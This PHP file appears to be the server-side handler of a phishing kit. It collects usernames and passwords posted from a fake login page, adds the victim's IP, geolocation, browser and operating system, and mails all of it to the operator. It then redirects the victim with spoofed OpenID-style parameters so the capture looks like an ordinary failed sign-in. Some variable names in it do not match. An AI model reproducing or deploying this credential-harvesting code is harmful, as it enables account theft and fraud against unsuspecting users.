<?php

session_start();

if($_SERVER['REQUEST_METHOD'] != "POST") {
    header("HTTP/1.0 403 Forbidden");
    print("Forbidden");
    exit();
}

if (!empty($_SERVER['HTTP_CLIENT_IP'])) { 
    $ip = $_SERVER['HTTP_CLIENT_IP']; 
} elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) { 
    $ip = $_SERVER['HTTP_X_FORWARDED_FOR']; 
} else { 
    $ip = $_SERVER['REMOTE_ADDR']; 
}

require_once('mail.php');
require_once('sync.php');
require_once('geo.php');

$geoplugin = new geoPlugin($ip);
$geoplugin->locate();
$cc = $geoplugin->countryCode;
$cn = $geoplugin->countryName;
$cr = $geoplugin->region;
$ct = $geoplugin->city;
$adddate=date("D M d, Y g:i a");
$hostname = gethostbyaddr($ip);
$br = $obj->showInfo('browser');
$op = $obj->showInfo('os');
$vr = $obj->showInfo('version');
$datum = date("D M d, Y g:i a");

$username = $_POST['user'];
$password = $_POST['pswd'];
$usr = base64_encode($username);

$message .= "-------------------------------------------------------------------------------------\n";
$message .= "Email: ".$user."\n";
$message .= "Password: ".$pass."\n";
$message .= "-------------------------------------------------------------------------------------\n";
$message .= "Web Browser: ".$br."\n";
$message .= "Web Browser Version: ".$vr."\n";
$message .= "Operating System: ".$op."\n";
$message .= "IP: ".$ip."\n";
$message .= "Location: ".$cn." (".$ct.", ".$cr.")\n";
$message .= "Submitted: ".$datum."\n";
$message .= "Host Name: ".$hostname."\n";
$message .= "-------------------------------------------------------------------------------------\n";

$subject = "Document viewed from $ip ($cn)";
$headers = "From: Login $cc <noreply>";
$headers .= $_POST['eMailAdd']."\n";
$headers .= "MIME-Version: 1.0\n";

if (empty($username) || empty($password)) {
	header("Location: errors.php?client_id=DCDB4AD9BD2E262AC38E65F8A64C02E5&response_mode=form_post&response_type=code+id_token&scope=openid+profile&Connect_Authentication_Properties&&nonce=1982950881dcdb4ad9bd2e262ac38e65f8a64c02e5&redirect_uri=&ui_locales=en-US&mkt=en-US&err=0&usr=$usr");
}
else {
mail($to,$subject,$message,$headers);
	header("Location: error.php?client_id=DCDB4AD9BD2E262AC38E65F8A64C02E5&response_mode=form_post&response_type=code+id_token&scope=openid+profile&Connect_Authentication_Properties&&nonce=1982950881dcdb4ad9bd2e262ac38e65f8a64c02e5&redirect_uri=&ui_locales=en-US&mkt=en-US&err=0&usr=$usr");
}

?>